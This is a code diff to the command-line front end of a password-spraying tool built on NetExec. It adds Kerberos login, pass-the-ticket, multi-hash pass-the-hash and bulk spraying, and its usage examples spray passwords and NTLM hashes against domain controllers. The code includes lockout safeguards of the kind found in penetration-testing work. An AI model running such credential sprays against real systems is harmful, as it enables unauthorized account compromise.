@@ -1,6 +1,7 @@
 """Command-line interface and run orchestration."""
 
 import argparse
+import ipaddress
 import json
 import signal
 import sys
@@ -16,13 +17,25 @@ from . import theme
 from . import ui
 from .loaders import (expand_targets, load_combos, load_list, load_prior_attempts,
                       load_spray_file)
-from .protocols import (ALL_PROTOCOLS, BUNDLES, NATIVE_PROTOCOLS, NXC_PROTOCOLS,
-                        PORTS, SERVICES, expand_bundles)
+from .parsing import mask_secret
+from .protocols import (ALL_PROTOCOLS, BUNDLES, KERBEROS_PROTOCOLS, LOCAL_AUTH_PROTOCOLS,
+                        NATIVE_PROTOCOLS, NXC_PROTOCOLS, PORTS, SERVICES, expand_bundles)
 from .results import (build_json, log_header, log_summary, write_csv, write_loot, write_report)
-from .runners import read_lockout_policy
+from .runners import KCACHE_USER, kcache_principal, read_lockout_policy
 from .theme import (BOLD, CYAN, GRAY, G_INFO, G_RND, G_SECT, G_SKIP, G_WARN,
                     RESET, YELLOW, gradient_text, rule)
-from .worker import preflight_checks, spray_one
+from .worker import preflight_checks, spray_bulk, spray_one
+
+
+def _looks_like_ip(target):
+    """True for a bare IPv4/IPv6 address (not a hostname/FQDN) - used to warn
+    that -k/--kerberos against such a target will usually fail (see the
+    kerberos target check in main())."""
+    try:
+        ipaddress.ip_address(target)
+        return True
+    except ValueError:
+        return False
 
 
 # A relevant usage example per option — shown when the parser errors, so a
@@ -35,11 +48,19 @@ _EXAMPLES = [
      "netexecspray smb 10.10.10.1 -c creds.txt"
      "   # 'user:pass' per line (paired): each user tries only its own password"),
     (("-H", "--hash"),
-     "netexecspray smb dc01.corp.local -u admin -H :32ed87bdb5fdc5e9cba88547376818d4"),
+     "netexecspray smb dc01.corp.local -u admin -H :32ed87bdb5fdc5e9cba88547376818d4\n"
+     "  netexecspray all hosts.txt -u users.txt -H hashes.txt"
+     "   # 1 hash/line (NT-only or LM:NT) -> all users x all hashes"),
     (("-U", "--userfile"),
      "netexecspray ad 10.10.10.0/24 -U users.txt -p 'Winter2025!' --safe"),
     (("--resume",),
      "netexecspray ad targets.txt -u users.txt -p p.txt --resume spray_prev.log"),
+    (("-k", "--kerberos", "-d", "--domain", "--kdc-host"),
+     "netexecspray smb dc01.corp.local -u users.txt -p 'Winter2025!' "
+     "-k -d corp.local --kdc-host 10.10.10.1"),
+    (("--use-kcache",),
+     "KRB5CCNAME=/tmp/krb5cc_1000 netexecspray ad dc01.corp.local --use-kcache"
+     "   # pass-the-ticket, no -u/-p needed"),
     (("--report", "--out-dir", "--json", "--output"),
      "netexecspray ad dc.corp -u u.txt -p p.txt --out-dir loot/ --report engagement.md"),
 ]
@@ -121,6 +142,8 @@ examples:
   %(prog)s smb 10.10.10.1 -u user1,user2 -p pass1,pass2    # inline lists, no files
   %(prog)s ad 10.129.0.0/24 -u users.txt -p 'Winter2025!' --safe
   %(prog)s ad corp.local -u users.txt -p pws.txt --max-attempts 3 --lockout-delay 60
+  %(prog)s smb dc01.corp.local -u users.txt -p 'Winter2025!' -k -d corp.local
+  KRB5CCNAME=/tmp/krb5cc_1000 %(prog)s ad dc01.corp.local --use-kcache   # pass-the-ticket
   %(prog)s all dc01.corp.local -u users.txt -H :32ed87bdb5fdc5e9cba88547376818d4
   %(prog)s mail mail.corp.com -u user@corp.com -p 'Pass'
   %(prog)s smb 10.10.10.1 --combo creds.txt           # user:pass stuffing
@@ -149,12 +172,34 @@ outputs (nothing is written unless you ask for it):
     cred.add_argument("-u", "--user", help="Username, comma-list (user1,user2), or file of usernames")
     cred.add_argument("-U", "--userfile", help="File of usernames (alias for -u <file>)")
     cred.add_argument("-p", "--password", help="Password, comma-list (pass1,pass2), or file of passwords")
-    cred.add_argument("-H", "--hash", metavar="HASH", help="NTLM hash for pass-the-hash (LM:NT or :NT)")
+    cred.add_argument("-H", "--hash", metavar="HASH",
+                       help="NTLM hash for pass-the-hash (NT-only, LM:NT, or :NT). "
+                            "Also accepts a comma-list or a file of one hash per line. "
+                            "With --combo or --spray-file, forces every secret from "
+                            "that file to be sprayed as a hash instead of relying on "
+                            "shape auto-detection")
     cred.add_argument("-c", "--combo", "--creds", metavar="FILE", dest="combo",
-                      help="File of user:pass per line (1:1 stuffing) — use instead of -u/-p")
+                      help="File of user:pass per line (1:1 stuffing) — use instead of -u/-p. "
+                           "Each secret is auto-detected as a hash or plaintext, so NTLM "
+                           "hashes and real passwords can be mixed in the same file")
     cred.add_argument("-S", "--spray-file", metavar="FILE", dest="spray_file",
                       help="Mixed file of 'user:pass' and bare 'user' lines → spray "
-                           "ALL users × ALL found passwords (pooled, not paired)")
+                           "ALL users × ALL found secrets (pooled, not paired). Each secret "
+                           "is auto-detected as a hash or plaintext, so NTLM hashes and real "
+                           "passwords can be mixed in the same file")
+
+    krb = parser.add_argument_group("kerberos")
+    krb.add_argument("-k", "--kerberos", action="store_true",
+                     help="Authenticate via Kerberos instead of NTLM (nxc-backed protocols; "
+                          "requires -d/--domain)")
+    krb.add_argument("-d", "--domain", metavar="DOMAIN",
+                     help="AD domain for Kerberos authentication (e.g. corp.local)")
+    krb.add_argument("--kdc-host", metavar="HOST", dest="kdc_host",
+                     help="FQDN/IP of the KDC (domain controller); defaults to nxc's own "
+                          "resolution from the domain")
+    krb.add_argument("--use-kcache", action="store_true", dest="use_kcache",
+                     help="Pass-the-ticket: use the Kerberos ticket in $KRB5CCNAME instead of "
+                          "a password/hash. Implies -k; standalone (no -u/-p/-H/--combo needed)")
 
     tgt = parser.add_argument_group("targeting")
     tgt.add_argument("--resolve", action="store_true", help="Resolve domain/hostname to IPs via DNS")
@@ -174,6 +219,16 @@ outputs (nothing is written unless you ask for it):
     tim.add_argument("--rate", type=float, default=0, metavar="N",
                      help="Global cap of N attempts/second across all threads")
     tim.add_argument("--jitter", metavar="A-B", help="Random per-attempt sleep, seconds (e.g. 0.5-2)")
+    tim.add_argument("--bulk", action="store_true",
+                     help="Hand each wave's userlist to nxc in ONE invocation per "
+                          "protocol/target instead of one process per credential. "
+                          "Much faster for big userlists, but trades away --jitter/"
+                          "--rate/--validate/local-auth auto-retry for that protocol+"
+                          "wave (nxc runs the whole list itself) — --max-attempts/"
+                          "--safe and --resume are still honored per user even in "
+                          "bulk mode. Works fine with -k/--kerberos. nxc-backed "
+                          "protocols + plaintext passwords only — hash mode, --combo, "
+                          "and --use-kcache still spray one at a time.")
 
     safe = parser.add_argument_group("lockout safety")
     safe.add_argument("--max-attempts", type=int, default=0, metavar="N",
@@ -201,29 +256,64 @@ outputs (nothing is written unless you ask for it):
 
 
 def _resolve_credentials(args, parser):
-    """Return (users, secrets, combos, is_hash) from the parsed args."""
-    is_hash = bool(args.hash)
+    """Return (users, secrets, combos) from the parsed args.
 
-    # pooled spray file: one file supplies both users and passwords → users × pws
+    ``secrets`` is a list of ``(value, is_hash)`` pairs; ``combos`` is a list
+    of ``(user, value, is_hash)`` triples. Carrying the hash flag per-secret
+    (rather than one global flag for the whole run) is what lets -S and
+    --combo files mix plaintext passwords and hashes freely — each secret is
+    auto-detected via :func:`looks_like_hash` there, since those formats have
+    no separate flag to say "this one's a hash". -u/-p/-H is unambiguous: -p
+    always means a literal password (even one shaped like a hash) and -H
+    always means a hash, with no auto-detection overriding either choice."""
+
+    # pass-the-ticket: no credentials to spray — a single pseudo-attempt per target
+    if args.use_kcache:
+        if (args.combo or args.spray_file or args.user or args.userfile
+                or args.password or args.hash):
+            parser.error("--use-kcache is standalone; don't combine it with "
+                         "-u/-U/-p/-H/--combo/--spray-file")
+        return [kcache_principal() or KCACHE_USER], [("", False)], []
+
+    # pooled spray file: one file supplies both users and secrets → users × secrets
     if args.spray_file:
-        if args.combo or args.user or args.userfile or args.password or args.hash:
+        if args.combo or args.user or args.userfile or args.password:
             parser.error("--spray-file is standalone; don't combine it with "
-                         "-u/-U/-p/-H/--combo")
+                         "-u/-U/-p/--combo")
         users, secrets = load_spray_file(args.spray_file)
         if not users:
             parser.error(f"No users loaded from {args.spray_file}")
         if not secrets:
             parser.error(f"{args.spray_file} has no 'user:pass' line to supply a "
-                         "password — add one, or spray with -u FILE -p PASS")
-        return users, secrets, [], False
-
-    combos  = load_combos(args.combo) if args.combo else []
+                         "secret — add one, or spray with -u FILE -p PASS/-H HASH")
+        if args.hash:
+            # same override --combo + -H supports: force every secret this
+            # file supplied to be sprayed as a hash, overriding
+            # load_spray_file()'s looks_like_hash() auto-detection. Needed
+            # for a hash shape the strict NTLM-only regex doesn't recognise
+            # (AES256 Kerberos keys, DCC2, etc.), which would otherwise be
+            # silently sprayed as -p plaintext with no way to correct it —
+            # unlike --combo, -S had no such escape hatch.
+            secrets = [(s, True) for s, _ in secrets]
+        return users, secrets, []
 
     if args.combo:
+        if args.user or args.userfile or args.password:
+            parser.error("--combo is standalone; don't combine it with "
+                         "-u/-U/-p (each combo line already carries its own "
+                         "user:secret)")
+        combos = load_combos(args.combo)
         if not combos:
             parser.error(f"No user:pass pairs loaded from {args.combo}")
-        users = list(dict.fromkeys(u for u, _ in combos))
-        return users, [], combos, is_hash
+        if args.hash:
+            # -H here isn't a secret of its own — it forces every combo
+            # secret to be sprayed as a hash, overriding load_combos()'s
+            # regex auto-detection. Needed for a hash shape the strict
+            # NTLM-only regex doesn't recognise (AES256 Kerberos keys, DCC2,
+            # etc.), which would otherwise be silently sprayed as -p plaintext.
+            combos = [(u, s, True) for u, s, _ in combos]
+        users = list(dict.fromkeys(u for u, _, _ in combos))
+        return users, [], combos
 
     if not args.user and not args.userfile:
         parser.error("Provide -u USER/FILE, -U USERFILE, or --combo FILE")
@@ -237,10 +327,19 @@ def _resolve_credentials(args, parser):
     if not users:
         parser.error("No users loaded")
 
-    secrets = [args.hash] if is_hash else load_list(args.password)
-    if not secrets:
-        parser.error("No passwords loaded")
-    return users, secrets, combos, is_hash
+    if args.hash:
+        secrets = [(h, True) for h in load_list(args.hash)]
+        if not secrets:
+            parser.error(f"No hashes loaded from {args.hash}")
+    else:
+        # -p is explicit and unambiguous (unlike -S/--combo, which have no
+        # separate flag to say "this one's a hash") — a password that happens
+        # to be shaped like a 32-hex NTLM hash is still a literal password
+        # here, not an auto-detected hash to silently reroute through -H.
+        secrets = [(s, False) for s in load_list(args.password)]
+        if not secrets:
+            parser.error("No passwords loaded")
+    return users, secrets, []
 
 
 def _artifact_paths(args, logfile):
@@ -276,7 +375,12 @@ def main(argv=None):
     else:
         args.jitter = None
 
-    users, secrets, combos, is_hash = _resolve_credentials(args, parser)
+    if args.use_kcache:
+        args.kerberos = True   # --use-kcache implies -k
+    elif args.kerberos and not args.domain:
+        parser.error("--kerberos requires -d/--domain (or use --use-kcache for pass-the-ticket)")
+
+    users, secrets, combos = _resolve_credentials(args, parser)
 
     requested = [p.strip().lower() for p in args.protocols.split(",") if p.strip()]
     protocols, unknown = expand_bundles(requested)
@@ -286,11 +390,91 @@ def main(argv=None):
                      f"  native     : {', '.join(NATIVE_PROTOCOLS)}\n"
                      f"  bundles    : {', '.join(BUNDLES)}")
 
-    raw_targets = load_list(args.target)
+    if args.local_auth:
+        no_local_auth = [p for p in protocols if p not in LOCAL_AUTH_PROTOCOLS]
+        if no_local_auth:
+            ui.cprint(f"  {YELLOW}{G_WARN} --local-auth has no effect for "
+                      f"{', '.join(no_local_auth)} (nxc only supports it for "
+                      f"{', '.join(sorted(LOCAL_AUTH_PROTOCOLS))}) — silently "
+                      f"dropped for those protocols{RESET}")
+
+    if args.kerberos:
+        no_kerberos = [p for p in protocols if p not in KERBEROS_PROTOCOLS]
+        if no_kerberos:
+            ui.cprint(f"  {YELLOW}{G_WARN} -k/--kerberos has no effect for "
+                      f"{', '.join(no_kerberos)} (nxc only supports Kerberos auth "
+                      f"for {', '.join(KERBEROS_PROTOCOLS)}) — silently skipped "
+                      f"for those protocols{RESET}")
+
+    native_in_play = [p for p in protocols if p in NATIVE_PROTOCOLS]
+    has_hash = any(h for _, h in secrets) or any(h for _, _, h in combos)
+    # only -S/--combo (without an explicit -H override) auto-detect hash-ness
+    # via looks_like_hash()'s shape guess — -H alone, or --combo + -H, is
+    # always an explicit, intentional choice. The native-protocol skip below
+    # applies either way (a hash is a hash to spray_one() regardless of how
+    # it got marked is_hash=True) — only the *misclassification* warning
+    # (wording below) is specific to the ambiguous, auto-detected case.
+    auto_detected = ((args.spray_file or args.combo) and not args.hash) and has_hash
+    all_native = native_in_play and len(native_in_play) == len(protocols)
+    if has_hash and native_in_play:
+        if auto_detected and not all_native:
+            # skipped outright for native protocols (smtp/imap/pop3/mysql
+            # don't support pass-the-hash) — otherwise only visible via
+            # --verbose or grepping the log. Only said this way when there's
+            # a real "elsewhere": if every selected protocol is native,
+            # there's nowhere for it to go via -H either, so that part of
+            # the message would itself be misleading (see the all_native
+            # branch below for that case).
+            ui.cprint(f"  {YELLOW}{G_WARN} a secret that looks like a hash (32-hex) "
+                      f"will be skipped for {', '.join(native_in_play)} (native "
+                      f"protocols don't support pass-the-hash) and sent via -H "
+                      f"pass-the-hash elsewhere — if it's actually a literal "
+                      f"password that happens to look like a hash, spray it "
+                      f"separately with -p{RESET}")
+        elif auto_detected and all_native:
+            ui.cprint(f"  {YELLOW}{G_WARN} a secret that looks like a hash (32-hex) "
+                      f"will be skipped entirely — every selected protocol "
+                      f"({', '.join(native_in_play)}) is native and doesn't support "
+                      f"pass-the-hash, so there's nowhere for it to be tried at all. "
+                      f"If it's actually a literal password that happens to look "
+                      f"like a hash, spray it separately with -p{RESET}")
+        else:
+            ui.cprint(f"  {YELLOW}{G_WARN} hash secrets will be skipped for "
+                      f"{', '.join(native_in_play)} (native protocols don't "
+                      f"support pass-the-hash){RESET}")
+    elif auto_detected:
+        # not skipped (no native protocols here), but still never tried as a
+        # literal password against anything — the same misclassification
+        # risk, just a different consequence (wrong auth mode, not no attempt).
+        ui.cprint(f"  {YELLOW}{G_WARN} a secret that looks like a hash (32-hex) "
+                  f"will be sprayed via -H pass-the-hash, not as a literal "
+                  f"password — if it's actually a real password that happens "
+                  f"to look like a hash, spray it separately with -p{RESET}")
+
+    raw_targets = load_list(args.target, is_target=True)
     if not raw_targets:
         parser.error("No targets loaded")
     targets = expand_targets(raw_targets, resolve=args.resolve,
                              expand_cidr=not args.no_expand_cidr, force=args.force)
+
+    if args.kerberos and not args.use_kcache:
+        # Kerberos asks the KDC for a service ticket keyed on the target's
+        # SPN (e.g. cifs/dc01.corp.local) - nxc builds that from whatever
+        # string is given as the target, so a bare IP (typed directly, or
+        # produced by --resolve/CIDR expansion) means nxc requests a ticket
+        # for "cifs/10.10.10.1", which the KDC doesn't have and can't issue.
+        # The usual fix is an /etc/hosts entry mapping the DC's IP to its
+        # real hostname, then targeting that hostname instead of the IP.
+        ip_targets = [t for t in targets if _looks_like_ip(t)]
+        if ip_targets:
+            sample = ", ".join(ip_targets[:3]) + (f" +{len(ip_targets) - 3} more"
+                                                   if len(ip_targets) > 3 else "")
+            ui.cprint(f"  {YELLOW}{G_WARN} -k/--kerberos against a bare IP target "
+                      f"({sample}) will usually fail — Kerberos needs the KDC to "
+                      f"issue a ticket for a hostname SPN, not an IP. Add the DC's "
+                      f"hostname to /etc/hosts and target that hostname instead "
+                      f"(don't combine with --resolve, which converts it back to "
+                      f"an IP){RESET}")
 
     # No files are written unless asked for: --output enables the log file,
     # --out-dir / --report / --json each enable their own artifact.
@@ -302,12 +486,20 @@ def main(argv=None):
     with state.counter_lock:
         state.counter["total"] = total
 
-    if args.combo:
-        secret_kind = f"{len(combos)} combos"
-    elif is_hash:
-        secret_kind = "hash"
+    if args.use_kcache:
+        secret_kind = "kerberos ticket (kcache)"
+    elif args.combo:
+        n_hash = sum(1 for _, _, h in combos if h)
+        secret_kind = f"{len(combos)} combos" + (f" ({n_hash} hash)" if n_hash else "")
     else:
-        secret_kind = f"{len(secrets)} passwords" if len(secrets) > 1 else "password"
+        n_hash  = sum(1 for _, h in secrets if h)
+        n_plain = len(secrets) - n_hash
+        parts = []
+        if n_plain:
+            parts.append(f"{n_plain} password" + ("" if n_plain == 1 else "s"))
+        if n_hash:
+            parts.append(f"{n_hash} hash" + ("" if n_hash == 1 else "es"))
+        secret_kind = " + ".join(parts) if parts else "password"
     tgt_str = ", ".join(targets[:2]) + (f" +{len(targets) - 2}" if len(targets) > 2 else "")
 
     started = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -325,9 +517,13 @@ def main(argv=None):
 
     # lockout policy: read it and auto-cap attempts per account
     if args.pass_pol or args.safe:
-        pu  = users[0]
-        ps  = combos[0][1] if args.combo else (args.hash if is_hash else secrets[0])
-        pol = read_lockout_policy(targets[0], pu, ps, is_hash, args.timeout)
+        pu = users[0]
+        if args.combo:
+            _, ps, ph = combos[0]
+        else:
+            ps, ph = secrets[0]
+        pol = read_lockout_policy(targets[0], pu, ps, ph, args.timeout,
+                                  args.kerberos, args.domain, args.kdc_host, args.use_kcache)
         if pol and pol["threshold"]:
             if not args.max_attempts:
                 args.max_attempts = max(pol["threshold"] - 1, 1)
@@ -341,7 +537,7 @@ def main(argv=None):
     log_header(logfile, started, protocols, targets, users, secret_kind, total, cmd)
     _print_banner(args, total, targets, users, secret_kind, tgt_str, protocols, logfile)
 
-    _run_spray(args, protocols, targets, users, secrets, combos, is_hash, logfile)
+    _run_spray(args, protocols, targets, users, secrets, combos, logfile)
 
     _finish(args, started, cmd, protocols, targets, users, secret_kind, logfile)
 
@@ -360,10 +556,13 @@ def _print_banner(args, total, targets, users, secret_kind, tgt_str, protocols, 
         f"{BOLD}{args.threads}{RESET}{GRAY}t{RESET}",
     ])
     flags = []
+    if args.bulk:         flags.append("bulk")
     if args.validate:     flags.append("validate")
     if args.max_attempts: flags.append(f"max{args.max_attempts}")
     if args.rate:         flags.append(f"{args.rate:g}/s")
     if args.proxychains:  flags.append("proxy")
+    if args.kerberos:
+        flags.append("kerberos(kcache)" if args.use_kcache else f"kerberos@{args.domain}")
     if flags:
         stats += dot + GRAY + " ".join(flags) + RESET
 
@@ -376,12 +575,63 @@ def _print_banner(args, total, targets, users, secret_kind, tgt_str, protocols, 
 
 
 # ── Spray loop ────────────────────────────────────────────────────────────────
-def _submit(pool, protos, pairs, targets, args, is_hash, logfile):
-    """Queue every proto × (user,secret) × target job onto the pool at once, so
-    up to --threads attempts run concurrently. Returns {future: (user, target)}."""
+def _submit(pool, protos, pairs, targets, args, logfile):
+    """Queue every proto × (user,secret,is_hash) × target job onto the pool at
+    once, so up to --threads attempts run concurrently. ``pairs`` carries the
+    hash flag per-secret, so a pooled/combo file mixing hashes and plaintext
+    passwords sends each to nxc as -H or -p correctly. Returns
+    {future: (user, target)}.
+
+    --bulk collapses a whole wave's users into one spray_bulk() job per
+    protocol/target instead of one spray_one() job per credential — plain
+    passwords only, and not for --combo (its 1:1 user:secret pairing doesn't
+    fit nxc's userfile × passfile cross product) or --use-kcache (a ticket is
+    one identity, not a userlist to spray). Kerberos (-k/--domain) is fine —
+    nxc's own -u/-p bulk flags work the same under -k, just scoped per proto
+    to KERBEROS_PROTOCOLS like the per-credential path already is. Everything
+    this excludes still goes through the per-credential path below unchanged."""
     futures = {}
+    kerberos = getattr(args, "kerberos", False)
+    bulk_ok = (getattr(args, "bulk", False) and not args.combo
+              and not getattr(args, "use_kcache", False)
+              and pairs and not any(h for _, _, h in pairs))
+    all_users = [u for u, _, _ in pairs]   # pairs is the same across every proto in this call
+
     for proto in protos:
-        for user, secret in pairs:
+        if (bulk_ok and proto not in NATIVE_PROTOCOLS
+                and (not kerberos or proto in KERBEROS_PROTOCOLS)):
+            # locked_users is read live (not hoisted) — an earlier proto in
+            # this same loop can lock an account mid-run.
+            with state.locked_lock:
+                locked_now = [u for u in all_users if u in state.locked_users]
+            users_here = [u for u in all_users if u not in locked_now]
+            if locked_now:
+                with state.counter_lock:
+                    state.counter["total"] -= len(locked_now) * len(targets)
+            if users_here:
+                secret = pairs[0][1]
+                for target in targets:
+                    if state.abort.is_set():
+                        return futures
+                    # `total` stays at its per-user granularity here (one
+                    # bulk job still represents len(users_here) users, and
+                    # spray_bulk()'s `finally` adds that same count to `done`
+                    # — collapsing `total` to 1 unit per job here would make
+                    # `done` overtake `total` once the job completes).
+                    fut = pool.submit(spray_bulk, proto, target, users_here, secret, logfile, args)
+                    # name real accounts in this diagnostic label, not just a
+                    # count — _drain() prints this verbatim on an unexpected
+                    # exception, and "5-user bulk" tells an operator nothing
+                    # about which 5 accounts were actually affected.
+                    sample = ", ".join(users_here[:3])
+                    if len(users_here) > 3:
+                        sample += f", +{len(users_here) - 3} more"
+                    futures[fut] = (f"bulk[{sample}]", target)
+                    if args.delay > 0:
+                        time.sleep(args.delay)
+            continue
+
+        for user, secret, is_hash in pairs:
             with state.locked_lock:
                 if user in state.locked_users:          # skip accounts already locked
                     with state.counter_lock:
@@ -406,7 +656,7 @@ def _drain(futures):
             ui.cprint(f"  {GRAY}thread {user}@{target}: {e}{RESET}")
 
 
-def _run_spray(args, protocols, targets, users, secrets, combos, is_hash, logfile):
+def _run_spray(args, protocols, targets, users, secrets, combos, logfile):
     state.start_time = time.time()
 
     def _sigint(signum, frame):
@@ -421,22 +671,27 @@ def _run_spray(args, protocols, targets, users, secrets, combos, is_hash, logfil
         ticker = threading.Thread(target=ui.ticker, daemon=True)
         ticker.start()
 
-    # one wave per password round, or a single wave for combo mode
+    # one wave per secret round, or a single wave for combo mode. Each pair
+    # carries its own is_hash flag now, so a round's secret (or a combo's
+    # per-user secret) can be a hash or a plaintext password independently.
     if args.combo:
-        waves = [("combo", None, combos)]
+        waves = [("combo", None, None, combos)]
     else:
-        waves = [(f"round {i + 1}/{len(secrets)}", s, [(u, s) for u in users])
-                 for i, s in enumerate(secrets)]
+        waves = [(f"round {i + 1}/{len(secrets)}", s, h, [(u, s, h) for u in users])
+                 for i, (s, h) in enumerate(secrets)]
 
     preflight_checks(protocols, targets, args, logfile)
     paced = args.lockout_delay > 0   # opt-in: one protocol section at a time
 
     with ThreadPoolExecutor(max_workers=args.threads) as pool:
-        for wi, (wlabel, wsecret, pairs) in enumerate(waves):
+        for wi, (wlabel, wsecret, wis_hash, pairs) in enumerate(waves):
             if state.abort.is_set():
                 break
             if len(waves) > 1 or args.combo:
-                tail = f"  {wsecret}" if wsecret else f"  {len(pairs)} pairs"
+                if wsecret:
+                    tail = f"  {mask_secret(wsecret, wis_hash)}"
+                else:
+                    tail = f"  {len(pairs)} pairs"
                 ui.cprint(f"\n{gradient_text(f'{G_RND} {wlabel}')}{GRAY}{tail}{RESET}")
 
             if paced:
@@ -445,14 +700,14 @@ def _run_spray(args, protocols, targets, users, secrets, combos, is_hash, logfil
                     if state.abort.is_set():
                         break
                     state.phase = f"{wlabel} · {proto}" if len(waves) > 1 else proto
-                    _drain(_submit(pool, [proto], pairs, targets, args, is_hash, logfile))
+                    _drain(_submit(pool, [proto], pairs, targets, args, logfile))
                     if proto != protocols[-1] and not state.abort.is_set():
                         ui.cprint(f"  {GRAY}… lockout delay {args.lockout_delay}s{RESET}")
                         time.sleep(args.lockout_delay)
             else:
                 # fast path: submit the whole wave at once so all threads stay busy
                 state.phase = wlabel if len(waves) > 1 else ""
-                _drain(_submit(pool, protocols, pairs, targets, args, is_hash, logfile))
+                _drain(_submit(pool, protocols, pairs, targets, args, logfile))
 
             if (len(waves) > 1 and wi < len(waves) - 1
                     and args.lockout_delay > 0 and not state.abort.is_set()):
